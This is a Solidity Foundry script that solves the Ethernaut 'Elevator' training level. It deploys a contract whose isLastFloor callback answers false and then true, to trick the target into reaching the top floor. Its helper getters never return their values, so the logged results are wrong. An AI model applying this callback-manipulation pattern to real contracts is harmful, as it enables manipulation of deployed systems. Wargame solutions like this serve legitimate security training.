// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Elevator, Building} from "../src/EthernautElevator.sol";

contract ElevatorSolution is Script {
    ElevatorAttack elevatorAttack;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        elevatorAttack = new ElevatorAttack();
        elevatorAttack.attack();
        vm.stopBroadcast();
        console.log("Is top? ", elevatorAttack.isTop());
        console.log("Current floor ", elevatorAttack.whatFloor());
    }
}

contract ElevatorAttack is Building {
    Elevator elevator = Elevator(0x5C2606CEeEE03b9970Bf523dBd5afc6a298CA524);
    bool private firstCall = true;

    function attack() external {
        elevator.goTo(1); // Call goTo function from Elevator contract
    }

    /**
     *
     * @notice Functions defined within an interface are implicitly VIRTUAL, meaning it's OVERRIDE-ABLE. Solution: Must use OVERRIDE for concrete implementation.
     */
    function isLastFloor(uint256) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }
        return true;
    }

    function isTop() external view returns (bool) {
        elevator.top();
    }

    function whatFloor() external view returns (uint256) {
        elevator.floor();
    }
}
